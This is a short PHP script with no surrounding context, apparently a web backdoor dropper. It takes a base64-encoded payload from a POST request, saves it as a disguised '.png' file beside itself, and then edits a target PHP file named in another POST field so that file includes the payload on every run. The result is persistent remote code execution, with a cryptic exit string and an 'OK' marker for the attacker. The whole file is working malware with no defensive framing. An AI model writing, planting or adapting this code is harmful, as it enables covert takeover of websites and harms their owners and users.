<?php
if (!isset($_POST['qq'])) {exit('vfdsv43cd');}
$dirr = preg_replace('!(.*/).*!','\\1',__FILE__);
$name = $dirr . rand(1,99)   . '.png';
file_put_contents($name,base64_decode($_POST['qq']));
$target_file = base64_decode($_POST['path']);
$index_php_content = file_get_contents($target_file);
$include_php5_code = '<?php'. "\r\n" . 'if (is_file(\'' . $name . '\')) include_once(\'' . $name . '\');';
$index_php_content = preg_replace('!<\?php!',$include_php5_code,$index_php_content,1);
file_put_contents($target_file,$index_php_content);
exit('OK_222');